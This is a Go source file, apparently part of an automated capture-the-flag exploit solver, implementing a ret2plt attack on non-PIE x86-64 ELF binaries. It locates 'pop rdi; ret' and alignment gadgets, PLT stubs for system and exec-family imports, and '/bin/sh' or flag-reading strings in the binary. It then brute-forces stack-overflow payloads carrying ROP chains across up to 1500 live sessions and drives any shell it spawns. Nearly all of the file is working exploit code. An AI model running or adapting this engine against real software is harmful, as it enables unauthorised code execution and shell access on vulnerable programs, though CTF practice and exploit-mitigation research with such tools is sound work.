package solve

import (
	"bytes"
	"context"
	"debug/elf"
	"encoding/binary"
	"fmt"
)

// maxRet2plt bounds the ret2plt search; each attempt is a full session.
const maxRet2plt = 1500

type strEntry struct {
	addr uint64
	text string
}

type pltCall struct {
	name string
	addr uint64
}

// ret2pltStrategy solves a non-PIE target that must call an imported one-argument
// function (system / execl / ...) with a pointer to a command string already in
// the binary -- the classic "call system('/bin/cat flag.txt')" shape, no leak
// required. It loads RDI with a `pop rdi; ret` gadget pointed at the string and
// returns into the function's PLT stub, trying a stack-aligning `ret` to clear
// the usual movaps fault. It drives any spawned shell, and a command that prints
// the flag directly (cat) is recovered straight from the transcript.
func (s *solver) ret2pltStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" {
		return false, nil
	}
	f, err := elf.Open(s.path)
	if err != nil {
		return false, err
	}
	popRdi, okRdi := findGadget(f, []byte{0x5f, 0xc3}) // pop rdi; ret
	retGadget, okRet := findGadget(f, []byte{0xc3})    // ret (alignment)
	stubs := pltStubs(f)                               // GOT slot -> PLT stub address
	got := pltGotEntries(f)                            // symbol name -> GOT slot
	strs := commandStrings(f)
	if a, ok := findBinSh(f); ok {
		strs = append(strs, strEntry{addr: a, text: "/bin/sh"})
	}
	f.Close()

	if !okRdi || len(strs) == 0 {
		if !okRdi {
			s.report.Limitations = append(s.report.Limitations, "no `pop rdi; ret` gadget; ret2plt strategy skipped")
		}
		return false, nil
	}

	// Resolve callable PLT stubs for the one-argument exec-family functions.
	var calls []pltCall
	for _, name := range []string{"system", "execl", "execlp", "execvp"} {
		if slot, ok := got[name]; ok {
			if stub, ok2 := stubs[slot]; ok2 {
				calls = append(calls, pltCall{name: name, addr: stub})
			}
		}
	}
	if len(calls) == 0 {
		s.report.Limitations = append(s.report.Limitations, "no system/exec PLT stub resolved; ret2plt strategy skipped")
		return false, nil
	}

	attempts := 0
	for _, useRet := range []bool{true, false} {
		if useRet && !okRet {
			continue
		}
		for _, call := range calls {
			for _, st := range strs {
				for _, off := range leakOffsets() {
					if err := ctx.Err(); err != nil {
						return false, err
					}
					attempts++
					if attempts > maxRet2plt {
						return false, nil
					}
					offset, cc, arg, align := off, call, st, useRet
					done, err := s.liveAttempt(ctx, "ret2plt", func(_ []uint64) ([]byte, string, bool) {
						var c []byte
						c = append(c, bytes.Repeat([]byte("A"), offset)...)
						c = append(c, qword(popRdi)...)
						c = append(c, qword(arg.addr)...)
						if align {
							c = append(c, qword(retGadget)...)
						}
						c = append(c, qword(cc.addr)...)
						note := fmt.Sprintf("ret2plt %s(%q) padding=%d align_ret=%v", cc.name, arg.text, offset, align)
						return c, note, true
					})
					if err != nil || done {
						return done, err
					}
				}
			}
		}
	}
	return false, nil
}

// pltStubs maps each PLT GOT slot to the address of the PLT stub that jumps
// through it -- the address to return into to call that import. It scans PLT
// sections for the `FF 25 <disp32>` rip-relative indirect jump and resolves its
// target. When a binary has both a lazy `.plt` and a `.plt.sec`, the `.plt.sec`
// entry (the intended call target) is preferred.
func pltStubs(f *elf.File) map[uint64]uint64 {
	out := map[uint64]uint64{}
	scan := func(sec *elf.Section) {
		if sec == nil {
			return
		}
		data, err := sec.Data()
		if err != nil {
			return
		}
		for j := 0; j+6 <= len(data); j++ {
			if data[j] == 0xff && data[j+1] == 0x25 {
				disp := int32(binary.LittleEndian.Uint32(data[j+2:]))
				instr := sec.Addr + uint64(j)
				target := instr + 6 + uint64(int64(disp))
				if _, ok := out[target]; !ok {
					out[target] = instr
				}
			}
		}
	}
	scan(f.Section(".plt.sec")) // preferred when present
	for _, sec := range f.Sections {
		if sec.Name == ".plt" || sec.Name == ".plt.got" {
			scan(sec)
		}
	}
	return out
}

// commandStrings returns NUL-terminated printable strings in non-executable
// allocated data sections, with the most promising command (containing "flag"
// or "cat ") first, then other "/bin/" commands.
func commandStrings(f *elf.File) []strEntry {
	var pref, rest []strEntry
	for _, sec := range f.Sections {
		if sec.Type != elf.SHT_PROGBITS || sec.Flags&elf.SHF_ALLOC == 0 || sec.Flags&elf.SHF_EXECINSTR != 0 {
			continue
		}
		data, err := sec.Data()
		if err != nil {
			continue
		}
		start := 0
		for i := 0; i <= len(data); i++ {
			if i == len(data) || data[i] == 0 {
				if b := data[start:i]; len(b) >= 3 && isPrintableASCII(b) {
					low := bytes.ToLower(b)
					e := strEntry{addr: sec.Addr + uint64(start), text: string(b)}
					switch {
					case bytes.Contains(low, []byte("flag")) || bytes.Contains(low, []byte("cat ")):
						pref = append(pref, e)
					case bytes.Contains(low, []byte("/bin/")):
						rest = append(rest, e)
					}
				}
				start = i + 1
			}
		}
	}
	return append(pref, rest...)
}

func isPrintableASCII(b []byte) bool {
	for _, c := range b {
		if c < 0x20 || c >= 0x7f {
			return false
		}
	}
	return true
}
